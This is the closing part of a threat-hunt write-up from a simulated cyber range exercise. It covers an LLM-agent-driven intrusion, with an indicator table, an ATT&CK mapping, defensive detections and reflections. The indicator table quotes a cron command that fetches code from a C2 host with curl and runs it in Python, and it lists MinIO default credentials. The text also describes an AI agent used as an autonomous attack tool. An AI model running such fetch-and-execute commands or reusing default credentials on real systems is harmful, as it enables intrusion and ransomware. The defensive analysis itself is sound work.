| Credential | `minioadmin:minioadmin` accepted by MinIO | Tools |
| Network | `45.131.66.106:4444` (C2) | Network artefact |
| Network | `64.20.53.230` (exploit staging) | IP |
| Persistence | `(langflow) CMD (curl -s http://45.131.66.106:4444/b \| python3 -)`, every 30 min | Host artefact |
| Account | `svc_maint` on `ff-nacos-01` | Host artefact |
| Pivot | PID `4471` (access/C2), PID `4491` (lateral movement), PID `8801` / UID `997` (privesc) | Host artefact |
| Pivot | `10.4.0.20:9000`, `10.4.0.30:3306`, `10.4.0.40:8848` | Host artefact |
| Data | `credentials.json` from the `terraform-state` bucket | Host artefact |
| Impact | `AES_ENCRYPT`, 1,342 rows, `config_info`, `history` | Host artefact |
| Impact | `README_RANSOM`; `e78393397@proton.me`; `3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy` | Host artefact |
| Agent | Session `jp-7f3c9a21`, actor `jadepuffer-agent` | Host artefact |

---

# MITRE ATT&CK mapping

| Technique | Name | Evidence in this case |
|---|---|---|
| T1190 | Exploit Public-Facing Application | Langflow code-validation endpoint |
| T1059.006 | Command and Scripting Interpreter: Python | Exploit and lateral-movement interpreters |
| T1571 | Non-Standard Port | C2 over TCP/4444 |
| T1053.003 | Scheduled Task/Job: Cron | 30-minute callback under `langflow` |
| T1552 / T1555 | Unsecured Credentials / Credentials from Password Stores | `pg_dump`, 214 secrets |
| T1046 | Network Service Discovery | Three-service sweep from PID 4491 |
| T1078.001 | Valid Accounts: Default Accounts | MinIO factory credentials |
| T1552.001 | Unsecured Credentials: Credentials In Files | `credentials.json` |
| T1005 | Data from Local System | Object retrieval and parsing |
| T1068 | Exploitation for Privilege Escalation | Nacos auth-bypass path |
| T1136.001 | Create Account: Local Account | `svc_maint` |
| T1611 | Escape to Host | Docker socket probe |
| T1486 / T1485 | Data Encrypted for Impact / Data Destruction | `AES_ENCRYPT` + table drops |

**MITRE ATLAS:** `AML.T0054` LLM Prompt Injection (the RCE endpoint was used to inject instructions into an agent's execution context) · `AML.T0048` Adversarial ML-Enabled Product (an LLM agent used as an autonomous attack tool).

---

# Recommended defensive actions

**Immediate**
1. Patch Langflow and restrict `/api/v1/validate/code`. Alert on any non-local POST to that path — it's the single highest-value rule out of this case.
2. Rotate MinIO's default credentials and every secret exposed through `terraform-state` and `credentials.json`. Assume all 214 are burned.
3. Disable `svc_maint` on `ff-nacos-01` and review everything it touched from 19:35 onward.
4. Remove the cron entry under `langflow` and audit every service-account crontab in the estate.

**Detection engineering**
5. Alert on Python interpreters spawned by web services, and on interpreters chained from other interpreters.
6. Alert on `pg_dump` (and equivalents) run by any account other than the designated backup identity.
7. Block or tightly control outbound non-standard ports from application servers; investigate 4444 specifically.
8. Detect cron modifications under service accounts.
9. Audit Nacos account creation and authentication-bypass patterns.

**Agent-aware monitoring — the part that's new**
10. Treat agent session logs as security telemetry. Isolate by `session_id` and `actor`, and alert on `user_input` objectives that don't match the assistant's sanctioned purpose.
11. Alert on first-person autonomous reasoning combined with multi-host action inside a short window.
12. Alert on rapid self-correction after a tool failure — failure, adapted retry, success, all inside seconds.

**Collection**
13. Fix the two gaps above: collect process hashes, and capture Docker API responses with container identity.

---

# What I took away from this

**Fix the collection before you buy the detection.** This estate has no process hashes at all. Any control that depends on file reputation was never going to fire, and nobody knew until someone counted.

**"I can't answer that" is a finding.** Two of the highest-scoring answers in this hunt were a corrected conclusion and a named gap. Both would have been easy to paper over with something that sounded right. The container-inventory question in particular is the one I'd point to — a fabricated answer there survives the review and then misleads whoever acts on the report.

**Identity and lineage beat binary names.** Every "real or noise" question resolved to a field describing *who* or *what started it*, never *what it is*. `pg_dump` is 28 results; `pg_dump` run by `langflow` is one. `python3.11` is everywhere; `python3.11` parented by `python3.11` is the attacker.

**The adversary logged its own reasoning.** That's the part of this case I'm still thinking about. Half this investigation came out of `LLMAgentLogs_CL` — the CVE, the classification breadth, the MinIO reasoning, the self-correction, the tasking instruction. Agent-driven attacks execute faster than humans can respond, but for now they can be extraordinarily loud in a table most SOCs don't collect yet.

**And the machine tells on itself.** A ransomware operator who leaves the documentation example wallet as their payment address is not a person who wants money. That one detail said more about what I was dealing with than any IOC in the case.

---

## Credits and disclaimer

Investigation performed on a simulated Microsoft Sentinel workspace as part of a cyber range exercise. The scenario reproduces the Sysdig Threat Research Team's JADEPUFFER disclosure (July 2026); all telemetry, hosts, accounts, and indicators here are synthetic and belong to the training environment.

Queries, analysis, and write-up are my own work.
